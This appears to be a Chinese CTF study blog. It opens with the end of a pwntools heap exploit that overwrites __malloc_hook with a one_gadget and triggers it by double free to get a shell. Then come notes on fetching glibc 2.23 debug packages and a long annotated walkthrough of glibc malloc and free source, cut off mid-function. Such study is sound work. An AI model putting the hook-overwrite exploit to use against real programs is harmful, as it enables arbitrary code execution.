# 这里到了最后一步：写malloc_hook里面的main_arena+88的最后三字节为one_gadget。
# 我通过0x45216可以计算出libc_base + 0x45216 = 0x7ffff7a52216，而main_arena+88为0x7ffff7dd1b78，因此写最后三位即可
# 开启ASLR的情况下，0x7ffff7a52216中的那个a不一定为a，这里的成功率也只有1/16，与前面的爆破加起来，概率只有1/4096了。
# one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

edit(index=7, content=b'a'*0x13 + b'\xa4\xd2\xaf')

# 完事之后，我们需要触发malloc_hook，简单的方式就是触发malloc_printerr，我们进行一个double free即可
# 我这里尝试了直接malloc，结果反而是无法得到shell，原因还真不太清楚
# add(index=11, size=0x50)
delete(index=5)
delete(index=5)
# debug()
sh.interactive()
```

# 记一次下载glibc 2.23-0ubuntu11.2

这个版本的`glibc`在`glibc-all-in-one`是没有的，但很多情况的ubuntu16实际上是这个`glibc`而不是现在用的`glibc2.23-0ubuntu11.3`。因此以备需要，这个还是需要有一份的。

在[这里](https://launchpad.net/ubuntu/+source/glibc/2.23-0ubuntu11.2)找到的。这里可以选择下amd64的和i386版本。

此外[这里](http://lliurex.net/xenial/pool/main/g/glibc/)也可以找到更多的版本。

进入对应的版本，我先是找到了对应的`deb`包（看着像的），然后直接解压，再解压，拿到一堆libs然后兴冲冲地拿去patchelf了。（后面补充：例如我下的`glibc2.27`的`1.4`版本是`libc6 2.27-3ubuntu1.4`和`libc6-dbg 2.27-3ubuntu1.4`版本）

发现运行起来是没问题的，但是在`gdb`调试的时候会提示没有`debug symbol`。这个时候看了看`glibc-all-in-one`的`download`脚本

发现里面有下载对应的`debug symbol`文件 

因此还是在下`libs`包的地方把带`dbg`文件的也搞下来，并且要解压在对应`libs`文件夹的`.debug`文件夹中（默认隐藏看不到）就可以调试了。

好吧 结果最后发现`BUU`用的应该是`glibc2.23-0ubuntu11`

# malloc源码解读

这里是`glibc 2.23-0ubuntu3`中的`./malloc/mallo.c`部分

```c
static void *
_int_malloc(mstate av, size_t bytes)
{
    INTERNAL_SIZE_T nb; /* normalized request size */
    unsigned int idx;   /* associated bin index */
    mbinptr bin;        /* associated bin */

    mchunkptr victim;     /* inspected/selected chunk */
    INTERNAL_SIZE_T size; /* its size */
    int victim_index;     /* its bin index */

    mchunkptr remainder;          /* remainder from a split */
    unsigned long remainder_size; /* its size */

    unsigned int block; /* bit map traverser */
    unsigned int bit;   /* bit map traverser */
    unsigned int map;   /* current word of binmap */

    mchunkptr fwd; /* misc temp for linking */
    mchunkptr bck; /* misc temp for linking */

    const char *errstr = NULL;

    /*
       Convert request size to internal form by adding SIZE_SZ bytes
       overhead plus possibly more to obtain necessary alignment and/or
       to obtain a size of at least MINSIZE, the smallest allocatable
       size. Also, checked_request2size traps (returning 0) request sizes
       that are so large that they wrap around zero when padded and
       aligned.
     */

    checked_request2size(bytes, nb); // 将用户请求的大小转化为一个系统中的大小，变量名为nb

    /* There are no usable arenas.  Fall back to sysmalloc to get a chunk from
       mmap.  */
    if (__glibc_unlikely(av == NULL)) // 大意应该是在还没有arena的时候使用mmap来分配chunk
    {
        void *p = sysmalloc(nb, av);
        if (p != NULL)
            alloc_perturb(p, bytes);
        return p;
    }

    /*
       If the size qualifies as a fastbin, first check corresponding bin.
       This code is safe to execute even if av is not yet initialized, so we
       can try it without checking, which saves some time on this fast path.
     */

    if ((unsigned long)(nb) <= (unsigned long)(get_max_fast())) // 请求的大小在fastbin之内
    {
        idx = fastbin_index(nb);             // 确定它属于10个fastbin的哪一个，获得下标
        mfastbinptr *fb = &fastbin(av, idx); // 根据下标获取这个fastbin的头
        mchunkptr pp = *fb;                  // 根据这个fastbin的头获得它的第一个chunk
        do
        {
            victim = pp;
            if (victim == NULL)
                break;
        } while ((pp = catomic_compare_and_exchange_val_acq(fb, victim->fd, victim)) != victim); // 遍历这个fastbin，获取对应的chunk作为victim
        if (victim != 0)                                                                         // 假如获取到了
        {
            if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0)) // 假如获取到的chunk的大小和请求的不同
            {
                errstr = "malloc(): memory corruption (fast)";
            errout:
                malloc_printerr(check_action, errstr, chunk2mem(victim), av);
                return NULL;
            }
            check_remalloced_chunk(av, victim, nb); // 检查是否合法
            void *p = chunk2mem(victim);            // 将chunk的系统地址转化为用户地址
            alloc_perturb(p, bytes);
            return p;
        }
    }

    /*
       If a small request, check regular bin.  Since these "smallbins"
       hold one size each, no searching within bins is necessary.
       (For a large request, we need to wait until unsorted chunks are
       processed to find best fit. But for small ones, fits are exact
       anyway, so we can check now, which is faster.)
     */

    if (in_smallbin_range(nb)) // 请求的大小位于smallbin
    {
        idx = smallbin_index(nb); // 请求的大小属于哪一个smallbin，找到下标idx
        bin = bin_at(av, idx);    // 通过下标找到具体的这个bin

        if ((victim = last(bin)) != bin) // last宏就是#define last(b) (b->bk)，因此就是定位到smallbin的最后一个chunk，而且smallbin不为空（bin->bk!=bin）
        {
            if (victim == 0) /* initialization check */
                             // 假如smallbin为空，那么这里不会进行分配，要到后面unsortedbin。合并所有的fastbin chunk，合并到unsorted bin里面去
                malloc_consolidate(av);
            else // 定位到了这个smallbin，取出里面的一个chunk，从队尾开始取
            {
                bck = victim->bk;                        // bck是victim的bk，也就是倒数第二个
                if (__glibc_unlikely(bck->fd != victim)) // bck的fd假如不为victim说明出错
                {
                    errstr = "malloc(): smallbin double linked list corrupted";
                    goto errout;
                }
                set_inuse_bit_at_offset(victim, nb); // 取出这个victim。也就是队尾的这一个。
                bin->bk = bck;                       // 取出后，bin的bk将会变成倒数第二个chunk
                bck->fd = bin;                       // 取出后，倒数第二个chunk将会指向small bin

                if (av != &main_arena) // 假如不是在主线程(main_arena)，添加上不是在main_arena的标记
                    victim->size |= NON_MAIN_ARENA;
                check_malloced_chunk(av, victim, nb);
                void *p = chunk2mem(victim); // 获得指向可用区域的指针
                alloc_perturb(p, bytes);
                return p; // 返回该指针
            }
        }
    }

    /*
       If this is a large request, consolidate fastbins before continuing.
       While it might look excessive to kill all fastbins before
       even seeing if there is space available, this avoids
       fragmentation problems normally associated with fastbins.
       Also, in practice, programs tend to have runs of either small or
       large requests, but less often mixtures, so consolidation is not
       invoked all that often in most programs. And the programs that
       it is called frequently in otherwise tend to fragment.
     */

    else // 假如该大小是属于largebin，这里是不会取出来的
    {
        idx = largebin_index(nb); // 定位到哪一个largebin
        if (have_fastchunks(av))  // 假如有fastbin chunk，统统合并到unsorted bin
            malloc_consolidate(av);
    }

    /*
       Process recently freed or remaindered chunks, taking one only if
       it is exact fit, or, if this a small request, the chunk is remainder from
       the most recent non-exact fit.  Place other traversed chunks in
       bins.  Note that this step is the only place in any routine where
       chunks are placed in bins.

       The outer loop here is needed because we might not realize until
       near the end of malloc that we should have consolidated, so must
       do so and retry. This happens at most once, and only when we would
       otherwise need to expand memory to service a "small" request.
     */

    for (;;)
    {
        int iters = 0;
        while ((victim = unsorted_chunks(av)->bk) != unsorted_chunks(av)) // 从Unsortedbin尾部开始遍历
        {
            bck = victim->bk;                                    // 当前遍历到的chunk的bk叫做bck
            if (__builtin_expect(victim->size <= 2 * SIZE_SZ, 0) // 当前遍历到的chunk的大小不合法（小于最小值或者大于最大值），那么退出
                || __builtin_expect(victim->size > av->system_mem, 0))
                malloc_printerr(check_action, "malloc(): memory corruption",
                                chunk2mem(victim), av);
            size = chunksize(victim); // 得到当前遍历到的chunk的大小，叫做size

            /*
               If a small request, try to use last remainder if it is the
               only chunk in unsorted bin.  This helps promote locality for
               runs of consecutive small requests. This is the only
               exception to best-fit, and applies only when there is
               no exact fit for a small chunk.
             */

            // 假如申请的chunk在smallbin范围内，且此时只有一个last_remainder在unsortedbin内部，且last_remainder还可以切割
            // 记得吗，假如small bin不为空，那么上面就已经被处理了。
            if (in_smallbin_range(nb) &&
                bck == unsorted_chunks(av) &&
                victim == av->last_remainder &&
                (unsigned long)(size) > (unsigned long)(nb + MINSIZE))
            {
                /* split and reattach remainder */
                // 将unsorted_bin里面的这个last_remainder切割后重新挂在Unsortedbin里面
                remainder_size = size - nb;                                    // 切割后的last_remainder的chunk大小
                remainder = chunk_at_offset(victim, nb);                       // 切割掉前面的部分，将切割后的指针返回
                unsorted_chunks(av)->bk = unsorted_chunks(av)->fd = remainder; // unsortedbin的fd和bk都指向剩余的last_remainder
                av->last_remainder = remainder;                                // 将全局变量last_remainder赋值为现在切割后的last_remainder
                remainder->bk = remainder->fd = unsorted_chunks(av);           // 同样的，last_remainder的fd和bk也指向unsorted bin
                if (!in_smallbin_range(remainder_size))                        // 若切割后的remainder已经不属于small bin的大小了，那么把fd/bk_nextsize置空
                {
                    remainder->fd_nextsize = NULL;
                    remainder->bk_nextsize = NULL;
                }

                // 接下来三行是将切割后的两个chunk的header标志位设置好，将切割后的last_remainder的foot设置为他现在的大小（它现在仍然为free)
                set_head(victim, nb | PREV_INUSE |
                                     (av != &main_arena ? NON_MAIN_ARENA : 0));
                set_head(remainder, remainder_size | PREV_INUSE);
                set_foot(remainder, remainder_size);

                check_malloced_chunk(av, victim, nb); // 检查一下分配出去的victim大小是否正确
                void *p = chunk2mem(victim);          // 得到用户指针
                alloc_perturb(p, bytes);
                return p;
            }

            // 假如不是只有个remainder
            // 设最后一个chunk为bck，将bck的fd指针指向unsortedbin
            /* remove from unsorted list */
            unsorted_chunks(av)->bk = bck;
            bck->fd = unsorted_chunks(av);

            /* Take now instead of binning if exact fit */

            if (size == nb) // 假如这个unsortedbin的chunk和请求的一模一样
            {
                set_inuse_bit_at_offset(victim, size); // 设置size位
                if (av != &main_arena)                 // 假如不是在main_arena还要设置对应标记
                    victim->size |= NON_MAIN_ARENA;
                check_malloced_chunk(av, victim, nb);
                void *p = chunk2mem(victim);
                alloc_perturb(p, bytes);
                return p; // 返回
            }

            /* place chunk in bin */
			// 假如遍历到这个chunk并不是和用户请求的一样大，那么根据其大小放入到对应的bin里面去
            if (in_smallbin_range(size)) // 假如是small chunk。
            {
                victim_index = smallbin_index(size); // 获取small chunk对应的bin的编号
                bck = bin_at(av, victim_index);      // 将这个bin赋给bck
                fwd = bck->fd;                       // 将这个bin的fd赋给fwd，也就是这个bin的第一个chunk
                // 这里还没放回去，但是获取到了要放入的small bin的头指针和第一个chunk
            }
            else
            {
                victim_index = largebin_index(size); // 找到对应的large bin的编号
                bck = bin_at(av, victim_index);      // 将对应的large bin赋给bck
                fwd = bck->fd;                       // 将对应的large bin的fd也就是第一个chunk设置为fwd

                /* maintain large bins in sorted order */
                if (fwd != bck) // 第一个chunk不是这个bin的头指针，即不为空
                {
                    /* Or with inuse bit to speed comparisons */
                    size |= PREV_INUSE;
                    /* if smaller than smallest, bypass loop below */
                    assert((bck->bk->size & NON_MAIN_ARENA) == 0);
                    if ((unsigned long)(size) < (unsigned long)(bck->bk->size)) // bck的bk是该largebin中最小的chunk，意思就是假如比这个largebin中最小的chunk还要小
                    {
                        fwd = bck;     // fwd现在是头指针
                        bck = bck->bk; // bck现在是最小的那个chunk

                        // 下面三行会将这个chunk插入到该bin的末尾
                        victim->fd_nextsize = fwd->fd;                                    //  victim的fd_nextsize现在是第一个节点
                        victim->bk_nextsize = fwd->fd->bk_nextsize;                       // victim的bk_nextsize应该为之前第一个节点的bk_nextsize
                        fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; // 同上更新指针
                    }
                    else // 假如不是比最小的chunk要小，那么要插入正确的位置
                    {
                        assert((fwd->size & NON_MAIN_ARENA) == 0);
                        while ((unsigned long)size < fwd->size) // 这个while就是通过fd_nextsize一直遍历到正确的size
                        {
                            fwd = fwd->fd_nextsize; // 更新fwd
                            assert((fwd->size & NON_MAIN_ARENA) == 0);
                        }
                        // 上面那个while存在两种遍历结果，一是遍历到了size == fwd->size，也有可能不存在和size一样大的chunk
                        // 那么这里是相等，也就是找到了
                        if ((unsigned long)size == (unsigned long)fwd->size)
                            /* Always insert in the second position.  */
                            fwd = fwd->fd; // fwd现在是这些一样大的chunk的第二个
                        else               // 假如size比fwd->size大了，那么说明没有和size一样大的chunk，victim将作为这个大小的第一个，因此会拥有fd_nextsize和bk_nextsize属性
                        {
                            victim->fd_nextsize = fwd;                 // victim的fd_nextsize指针就是fwd
                            victim->bk_nextsize = fwd->bk_nextsize;    // victim的bk_nextsize是fwd的bk_nextsize
                            fwd->bk_nextsize = victim;                 // 更新指向victim的指针
                            victim->bk_nextsize->fd_nextsize = victim; // 更新指向victim的指针
                        }
                        bck = fwd->bk;
                    }
                }
                else // 这个是if(fwd!=bck)的else，即当前largebin为空
                    // 设置victim的fd_nextsize和bk_nextsize为本身
                    victim->fd_nextsize = victim->bk_nextsize = victim;
            }

            mark_bin(av, victim_index); // 这是bitmap
            // 上面无论是插入到哪里，都没有更新fd和bk指针，这里更新这两个指针
            victim->bk = bck;
            victim->fd = fwd;
            fwd->bk = victim;
            bck->fd = victim;

#define MAX_ITERS 10000
            if (++iters >= MAX_ITERS) // 假如遍历了10000次了，那就break
                break;
        }

        /*
           If a large request, scan through the chunks of current bin in
           sorted order to find smallest that fits.  Use the skip list for this.
         */

        // 上面已经整理完了unsorted bin了
        // 若这个请求不是small bin（即就是large bin
        if (!in_smallbin_range(nb))
        {
            bin = bin_at(av, idx); // 找到对应的largebin的头指针

            /* skip scan if empty or largest chunk is too small */
            // 不为空且这个largebin中最大的chunk大于用户请求
            if ((victim = first(bin)) != bin &&
                (unsigned long)(victim->size) >= (unsigned long)(nb))
            {
                // victim现在是victim的bk_nextsize，就是该bin中大小最小的chunk
                victim = victim->bk_nextsize;
                // 遍历当前largebin，假如size小于用户请求则继续访问bk_nextsize
                while (((unsigned long)(size = chunksize(victim)) <
                        (unsigned long)(nb)))
                    victim = victim->bk_nextsize;

                /* Avoid removing the first entry for a size so that the skip
                   list does not have to be rerouted.  */
                // 假如victim不是当前largebin的最后一个chunk，且这个大小的chunk不止一个
                if (victim != last(bin) && victim->size == victim->fd->size)
                    victim = victim->fd; // 因为不止一个，所以victim就不取含有fd_nextsize指针的第一个

                // 将这个large chunk切割，剩余的部分是remainder
                remainder_size = size - nb;
                // 将这个large chunk进行unlink
                unlink(av, victim, bck, fwd);

                /* Exhaust */
                // 假如remainder的大小比minsize还小，不管他了
                if (remainder_size < MINSIZE)
                {
                    // 设置victim的size位和mainarena位
                    set_inuse_bit_at_offset(victim, size);
                    if (av != &main_arena)
                        victim->size |= NON_MAIN_ARENA;
                }
                /* Split */
                else // 假如remainder比minsize大，还可以用
                {
                    remainder = chunk_at_offset(victim, nb); // remainder是切割后剩下的部分
                    /* We cannot assume the unsorted list is empty and therefore
                       have to perform a complete insert here.  */
                    // 不敢保证这个时候unsortedbin是空的，因此必须执行一次完整的插入
                    bck = unsorted_chunks(av);            // bck是unsorted bin的头指针
                    fwd = bck->fd;                        // fwd是unsortedbin的第一个chunk
                    if (__glibc_unlikely(fwd->bk != bck)) // 假如unsortedbin的第一个chunk的bk不为unsorted bin的头指针了，报错
                    {
                        errstr = "malloc(): corrupted unsorted chunks";
                        goto errout;
                    }
                    // 将remainder插入到unsortedbin中的第一个chunk
                    remainder->bk = bck;                    // remainder的bk是头指针
                    remainder->fd = fwd;                    // remainder的fd是本来的第一个chunk
                    bck->fd = remainder;                    // 头指针指向这个remainder
                    fwd->bk = remainder;                    // 原本第一个chunk的bk指向remainder
                    if (!in_smallbin_range(remainder_size)) // 假如remainder比较大，属于large chunk，还要添加指针
                    {
                        remainder->fd_nextsize = NULL; // 这两个都暂时设置为NULL
                        remainder->bk_nextsize = NULL;
                    }
                    set_head(victim, nb | PREV_INUSE |
                                         (av != &main_arena ? NON_MAIN_ARENA : 0)); // 返回给用户，设置对应的位
                    set_head(remainder, remainder_size | PREV_INUSE);
                    set_foot(remainder, remainder_size);
                }
                check_malloced_chunk(av, victim, nb);
                void *p = chunk2mem(victim); // 将chunk的地址转化为用户地址
                alloc_perturb(p, bytes);
                return p;
            }
        }

        /*
           Search for a chunk by scanning bins, starting with next largest
           bin. This search is strictly by best-fit; i.e., the smallest
           (with ties going to approximately the least recently used) chunk
           that fits is selected.

           The bitmap avoids needing to check that most blocks are nonempty.
           The particular case of skipping all bins during warm-up phases
           when no chunks have been returned yet is faster than it might look.
         */
		
        // 在这之前，我们已经找了fastbin、smallbin、unsortedbin、对应的largebin，运行到这里说明都没找到
        // 那么接下来，我们只能找一个更大的来进行切割
        // 这部分是binmap，暂时还没看明白，先跳过去看topchunk了。
        ++idx;
        bin = bin_at(av, idx); 
        block = idx2block(idx);
        map = av->binmap[block];
        bit = idx2bit(idx);

        for (;;)
        {
            /* Skip rest of block if there are no more set bits in this block.  */
            if (bit > map || bit == 0)
            {
                do
                {
                    if (++block >= BINMAPSIZE) /* out of bins */
                        goto use_top;
                } while ((map = av->binmap[block]) == 0);

                bin = bin_at(av, (block << BINMAPSHIFT));
                bit = 1;
            }

            /* Advance to bin with set bit. There must be one. */
            while ((bit & map) == 0)
            {
                bin = next_bin(bin);
                bit <<= 1;
                assert(bit != 0);
            }

            /* Inspect the bin. It is likely to be non-empty */
            victim = last(bin);

            /*  If a false alarm (empty bin), clear the bit. */
            if (victim == bin)
            {
                av->binmap[block] = map &= ~bit; /* Write through */
                bin = next_bin(bin);
                bit <<= 1;
            }

            else
            {
                size = chunksize(victim);

                /*  We know the first chunk in this bin is big enough to use. */
                assert((unsigned long)(size) >= (unsigned long)(nb));

                remainder_size = size - nb;

                /* unlink */
                unlink(av, victim, bck, fwd);

                /* Exhaust */
                if (remainder_size < MINSIZE)
                {
                    set_inuse_bit_at_offset(victim, size);
                    if (av != &main_arena)
                        victim->size |= NON_MAIN_ARENA;
                }

                /* Split */
                else
                {
                    remainder = chunk_at_offset(victim, nb);

                    /* We cannot assume the unsorted list is empty and therefore
                       have to perform a complete insert here.  */
                    bck = unsorted_chunks(av);
                    fwd = bck->fd;
                    if (__glibc_unlikely(fwd->bk != bck))
                    {
                        errstr = "malloc(): corrupted unsorted chunks 2";
                        goto errout;
                    }
                    remainder->bk = bck;
                    remainder->fd = fwd;
                    bck->fd = remainder;
                    fwd->bk = remainder;

                    /* advertise as last remainder */
                    if (in_smallbin_range(nb))
                        av->last_remainder = remainder;
                    if (!in_smallbin_range(remainder_size))
                    {
                        remainder->fd_nextsize = NULL;
                        remainder->bk_nextsize = NULL;
                    }
                    set_head(victim, nb | PREV_INUSE |
                                         (av != &main_arena ? NON_MAIN_ARENA : 0));
                    set_head(remainder, remainder_size | PREV_INUSE);
                    set_foot(remainder, remainder_size);
                }
                check_malloced_chunk(av, victim, nb);
                void *p = chunk2mem(victim);
                alloc_perturb(p, bytes);
                return p;
            }
        }

    use_top:
        /*
           If large enough, split off the chunk bordering the end of memory
           (held in av->top). Note that this is in accord with the best-fit
           search rule.  In effect, av->top is treated as larger (and thus
           less well fitting) than any other available chunk since it can
           be extended to be as large as necessary (up to system
           limitations).

           We require that av->top always exists (i.e., has size >=
           MINSIZE) after initialization, so if it would otherwise be
           exhausted by current request, it is replenished. (The main
           reason for ensuring it exists is that we may need MINSIZE space
           to put in fenceposts in sysmalloc.)
         */
        
        // 假如别的块都不符合，那就只能top chunk来了

        victim = av->top; // victim现在是top chunk
        size = chunksize(victim); // 获取top chunk的大小

        // 分割后必须要留出一个minsize来处理请求，因此这里判断是否大于用户请求的大小+minsize
        if ((unsigned long)(size) >= (unsigned long)(nb + MINSIZE)) 
        {
            remainder_size = size - nb; // 切割后的部分的大小
            remainder = chunk_at_offset(victim, nb); // 获取切割后的部分的地址
            av->top = remainder; // 切割后的部分现在成为top chunk
            set_head(victim, nb | PREV_INUSE |
                                 (av != &main_arena ? NON_MAIN_ARENA : 0)); // 设置header位
            set_head(remainder, remainder_size | PREV_INUSE);

            check_malloced_chunk(av, victim, nb);
            void *p = chunk2mem(victim); // 将切割出去的部分转化为用户地址
            alloc_perturb(p, bytes);
            return p;
        }

        /* When we are using atomic ops to free fast chunks we can get
           here for all block sizes.  */
        else if (have_fastchunks(av)) // 假如top chunk不满足大小要求，那么检查是不是有fastbin chunk
        {
            malloc_consolidate(av); // 有，将其全部合并
            /* restore original bin index */
            if (in_smallbin_range(nb)) // 假如nb是在small bin范围
                idx = smallbin_index(nb); // 尝试获取其idx
            else // 假如是large bin范围
                idx = largebin_index(nb); // 尝试获取其idx
        }

        /*
           Otherwise, relay to handle system-dependent cases
         */
        else
        {
            void *p = sysmalloc(nb, av);
            if (p != NULL)
                alloc_perturb(p, bytes);
            return p;
        }
    }
}
```

现在，我们来总结一下整个`glibc 2.23`的申请流程：

- 将用户请求转化为合法的真实大小

- 检查现在是不是还没有`arena`，如果没有的话，申请一块内存作为`arena`
- 检查这是不是在`fast bin`范围内，如果是的话，通过请求的大小确定它属于`fastbin`的哪一个，将其标号设为`idx`。接下来，从这个`fastbin`的头指针开始进行遍历，若找到了对应的`chunk`满足请求，那么会检查这个`chunk`所在的`fastbin`是不是刚开始的`idx`，若不是则抛出`malloc(): memory corruption(fast)`的错误，通过检查则返回给用户。
- 若不是`fast bin`范围内的，则检查是不是在`small bin`范围内。如果是的话，找到其属于的`small bin`，将其标号设为`idx`。若此时`small bin`为空，那么会调用`malloc_consolidate()`将所有的`fastbin chunk`进行合并并置入`unsorted bin`。若`small bin`不为空，那么将通过`unlink`的方式来取出`small bin`中末尾的`chunk`。
- 若不是`small bin`范围内的，那么检查是不是`large bin`范围内，若是则会合并所有的`fast bin chunk`并置入`unsorted bin`，但也仅此而已，即使在`largebin`范围内暂时也不会分配。
- 检查直接与`unsorted bin`相连的`chunk`是不是`last_remainder`，假如是，而且请求的大小又是在`small bin `范围内，因为刚刚`small bin`为空才运行到这里的，那么就尝试切割`last_remainder`，将用户请求的大小返回，切割后剩下的部分作为新的`last_remainder`。若新的`last_remainder`是在`large chunk`范围内，还要将`fd_nextsize、bk_nextsize`指针置空。
- 倒序遍历`unsorted bin`。从`unsorted bin`的最后一个`chunk`开始，假如找到一个和请求的大小一模一样的`chunk`，那么会将其返回给用户。假如不是一模一样，那么看遍历到的这个`chunk`是属于`small bin`的还是属于`large bin`的`chunk`。若其是`small bin`的`chunk`，那么将其插入到其属于的`small bin`的头部。若其是`large bin`的`chunk`，那么要根据其大小插入到正确的位置，若没有和它一样大的`chunk`还要设置`fd_nextsize`和`bk_nextsize`。遍历的时候，遍历了一万次会自动退出。
- 遍历完`unsorted bin`后，判断它是不是属于`large bin`范围内。若是，则找到其属于的`large bin`。若这个`large bin`中为空或者最大的`chunk`都不满足用户请求的大小，那么跳过这一步，看下一步。若有满足的`chunk`，那么从最小的`chunk`通过`bk_nextsize`进行遍历，找到最小的满足这个用户请求的`chunk`，若这个大小的不止一个，那么为了避免取出具有`fd_nextsize`指针的节点的`chunk`，就取出其`fd`指针指向的第二个，将其进行切割，用户请求的大小返回，剩下的部分假如还比`minsize`大则插入到`unsorted bin`中的头部，若剩下的部分仍然是属于`large chunk`的，那么会设置其`fd_nextsize`指针和`bk_nextsize`指针。
- 假如仍然没找到，此时要找到一个略大于用户请求的`chunk`来进行切割，这里是用`binmap`来进行遍历的`large bin`，此处待补充。
- 若仍然没找到，那么会去检查`top chunk`。若`top chunk`大于用户请求的`chunk`的大小再加上一个`minsize`，那么就可以对`top chunk`进行切割，将用户请求返回，剩下的部分成为新的`top chunk`。
- 若`top chunk`仍然不满足，那么检查是不是有`fast bin chunk`存在，将其全部合并。尝试获取用户请求的大小是不是在`small bin`或者`large bin`范围内。
- 还不行，只能让操作系统分配一块新的内存了。

# free源码解读

```c
static void
_int_free(mstate av, mchunkptr p, int have_lock)
{
    INTERNAL_SIZE_T size;     /* its size */
    mfastbinptr *fb;          /* associated fastbin */
    mchunkptr nextchunk;      /* next contiguous chunk */
    INTERNAL_SIZE_T nextsize; /* its size */
    int nextinuse;            /* true if nextchunk is used */
    INTERNAL_SIZE_T prevsize; /* size of previous contiguous chunk */
    mchunkptr bck;            /* misc temp for linking */
    mchunkptr fwd;            /* misc temp for linking */

    const char *errstr = NULL;
    int locked = 0;

    // 计算要释放的chunk的大小
    size = chunksize(p);

    /* Little security check which won't hurt performance: the
       allocator never wrapps around at the end of the address space.
       Therefore we can exclude some size values which might appear
       here by accident or by "design" from some intruder.  */
    // 安全检查：指针越界或者没对齐，那么报错
    if (__builtin_expect((uintptr_t)p > (uintptr_t)-size, 0) || __builtin_expect(misaligned_chunk(p), 0))
    {
        errstr = "free(): invalid pointer";
    errout:
        if (!have_lock && locked)
            (void)mutex_unlock(&av->mutex);
        malloc_printerr(check_action, errstr, chunk2mem(p), av);
        return;
    }
    /* We know that each chunk is at least MINSIZE bytes in size or a
       multiple of MALLOC_ALIGNMENT.  */
    // 假如要释放的chunk大小甚至小于minsize或者没有对齐，那么报错
    if (__glibc_unlikely(size < MINSIZE || !aligned_OK(size)))
    {
        errstr = "free(): invalid size";
        goto errout;
    }

    check_inuse_chunk(av, p);

    /*
      If eligible, place chunk on a fastbin so it can be found
      and used quickly in malloc.
    */
    // 假如这个chunk的大小在fastbin范围内。若设置了TRIM_FASTBINS，那么还要检查其不是直接与topchunk相连。
    if ((unsigned long)(size) <= (unsigned long)(get_max_fast())

#if TRIM_FASTBINS
        /*
    If TRIM_FASTBINS set, don't place chunks
    bordering top into fastbins
        */
        && (chunk_at_offset(p, size) != av->top)
#endif
    )
    {
        // 若要释放的chunk的下一个chunk小于Minsize，或者大于最大size，那么说明有问题，报错
        if (__builtin_expect(chunk_at_offset(p, size)->size <= 2 * SIZE_SZ, 0) || __builtin_expect(chunksize(chunk_at_offset(p, size)) >= av->system_mem, 0))
        {
            /* We might not have a lock at this point and concurrent modifications
               of system_mem might have let to a false positive.  Redo the test
               after getting the lock.  */
            if (have_lock || ({
                    assert(locked == 0);
                    mutex_lock(&av->mutex);
                    locked = 1;
                    chunk_at_offset(p, size)->size <= 2 * SIZE_SZ || chunksize(chunk_at_offset(p, size)) >= av->system_mem;
                }))
            {
                errstr = "free(): invalid next size (fast)";
                goto errout;
            }
            if (!have_lock)
            {
                (void)mutex_unlock(&av->mutex);
                locked = 0;
            }
        }
        
        // 特定情况下初始化memory，特定情况才需要关心
        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);

        // 计算其size属于哪一个fastbin，并获得它的头指针
        set_fastchunks(av);
        unsigned int idx = fastbin_index(size);
        fb = &fastbin(av, idx);

        /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
        // 将fastbin的第一个chunk赋值给old
        mchunkptr old = *fb, old2;
        // 将old_idx设置为最大的unsigned int值
        unsigned int old_idx = ~0u;
        do
        {
            /* Check that the top of the bin is not the record we are going to add
               (i.e., double free).  */
               // double free的一个检查，若这个fastbin里面的某个chunk就是要释放的chunk，那么报错
            if (__builtin_expect(old == p, 0))
            {
                errstr = "double free or corruption (fasttop)";
                goto errout;
            }
            /* Check that size of fastbin chunk at the top is the same as
               size of the chunk that we are adding.  We can dereference OLD
               only if we have the lock, otherwise it might have already been
               deallocated.  See use of OLD_IDX below for the actual check.  */
            // 假如要释放的chunk属于的这个fastbin不为空，那么获得这个fastbin里面的chunk属于哪一个fastbin
            if (have_lock && old != NULL)
                old_idx = fastbin_index(chunksize(old));
            p->fd = old2 = old;
        } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2); // 假如添加成功那么循环将结束，说明只检查了与头指针相连的chunk！

        // 假如验证置入的chunk和bin里面的chunk不属于一个fastbin。报错
        if (have_lock && old != NULL && __builtin_expect(old_idx != idx, 0))
        {
            errstr = "invalid fastbin entry (free)";
            goto errout;
        }
    }

    /*
      Consolidate other non-mmapped chunks as they arrive.
    */
   // 假如不属于fastbin，且该chunk不是通过mmap映射的
    else if (!chunk_is_mmapped(p))
    {
        // 要加锁
        if (!have_lock)
        {
            (void)mutex_lock(&av->mutex);
            locked = 1;
        }
        // nextchunk变量赋值为p物理位置的下一个chunk
        nextchunk = chunk_at_offset(p, size);

        /* Lightweight tests: check whether the block is already the
           top block.  */
        // 假如要释放的chunk是top chunk，报错
        if (__glibc_unlikely(p == av->top))
        {
            errstr = "double free or corruption (top)";
            goto errout;
        }
        /* Or whether the next chunk is beyond the boundaries of the arena.  */
        // 假如内存区域不是连续的，报错。假如要释放的chunk的下一个chunk地址比top chunk还大，那么报错
        if (__builtin_expect(contiguous(av) && (char *)nextchunk >= ((char *)av->top + chunksize(av->top)), 0))
        {
            errstr = "double free or corruption (out)";
            goto errout;
        }
        /* Or whether the block is actually not marked used.  */
        // 下一个chunk有prev_inuse，假如下一个chunk说要释放的chunk p已经被释放了，那么可能double free，报错
        if (__glibc_unlikely(!prev_inuse(nextchunk)))
        {
            errstr = "double free or corruption (!prev)";
            goto errout;
        }

        // 获取下一个chunk的大小
        nextsize = chunksize(nextchunk);
        // 下一个chunk的大小不能小于最小值也不能大于最大值
        if (__builtin_expect(nextchunk->size <= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize >= av->system_mem, 0))
        {
            errstr = "free(): invalid next size (normal)";
            goto errout;
        }

        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);

        /* consolidate backward */
        // 假如要释放的chunk p的前一个chunk也是free状态，那么要发生合并。注意，fastbin不会运行到这里因此不会发生合并
        if (!prev_inuse(p))
        {
            prevsize = p->prev_size; // 通过chunk p来获得前一个chunk的大小，因此这里就可以伪造
            size += prevsize; // 获得合并后整个chunk的大小
            p = chunk_at_offset(p, -((long)prevsize)); // 将chunk p的地址设置为合并后的地址
            unlink(av, p, bck, fwd); // 将要释放的chunk p进行unlink。由于p其实是前一个chunk的地址，因此是把被合并的前一个chunk进行unlink。
        }

        // 假如chunkp的下一个chunk不是top chunk
        if (nextchunk != av->top)
        {
            /* get and clear inuse bit */
